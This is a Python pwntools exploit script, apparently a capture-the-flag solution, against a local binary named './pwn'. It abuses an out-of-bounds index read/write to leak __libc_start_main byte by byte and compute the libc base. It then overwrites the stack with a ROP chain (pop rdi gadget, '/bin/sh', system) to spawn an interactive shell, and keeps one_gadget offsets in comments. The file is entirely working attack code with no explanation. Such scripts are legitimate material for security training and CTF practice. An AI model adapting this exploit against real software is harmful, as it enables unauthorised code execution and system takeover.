from pwn import *
from LibcSearcher import *

context.log_level='DEBUG'

p=process('./pwn')
#libc=ELF('/root/LibcSearcher/libc-database/db/libc6_2.28-0ubuntu1_amd64.so')
libc=ELF('/lib/x86_64-linux-gnu/libc-2.28.so')

p.sendlineafter('name:','5n1p3r0010')

leak=[]
for i in range(6):
	p.sendlineafter('index',str(632+i))		#632=0x7fffffffe178-(0x7fffffffe050-0x150)
	p.recvuntil('now value(hex) ')
	recv='0x'+p.recvuntil('\n',drop=True)
	p.sendlineafter('input new value\n',str(int(recv,16)))
	leak.append(recv)
	print recv

leak_start=0
for i in range(6):
	leak_start+=(int(leak[i],16)&0xff)<<(i*8)
libc_start=leak_start-235
success('leak_start_main:'+hex(libc_start))

'''
obj=LibcSearcher('__libc_start_main',libc_start)
libc_base=leak_start-obj.dump('__libc_start_main')	#then we can decide the version of libc,
																#use one_gadget to rce
0x50186 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x501e3 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x103f50 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

libc_base=libc_start-libc.sym['__libc_start_main']
success('libc_base:'+hex(libc_base))
one=libc_base+0x103f50
'''
0x0000000000023a5f : pop rdi ; ret
'''
prdi=0x23a5f+libc_base
binsh=libc_base+libc.search('/bin/sh').next()
sys=libc_base+libc.sym['system']
success('prdi:'+hex(prdi))
success('binsh:'+hex(binsh))
success('sys:'+hex(sys))
success('one:'+hex(one))
#gdb.attach(p)

def my_write(cur,cnt):
	p.sendlineafter('input index\n',str(cur))
	p.recvuntil('now value(hex) ')
	p.sendlineafter('input new value\n',str(cnt))
#arbitrary write to rce

for i in range(344,350):
	num=(prdi>>((i-344)*8))&0xff
	my_write(i,num)
for i in range(352,358):
	num=(binsh>>((i-352)*8))&0xff
	my_write(i,num)
	my_write(358,0)
	my_write(359,0)
for i in range(360,366):
	num=(sys>>((i-360)*8))&0xff
	my_write(i,num)

'''
for i in range(6):
	p.sendlineafter('input index\n',str(344+i))
	num=(one>>(i*8))&0xff
	print hex(num)
	p.recvuntil('now value(hex) ')
	p.sendlineafter('input new value\n',str(num))
'''
gdb.attach(p,gdbscript='''
	b *$rebase(0x0000000000000B90)
''')
p.interactive()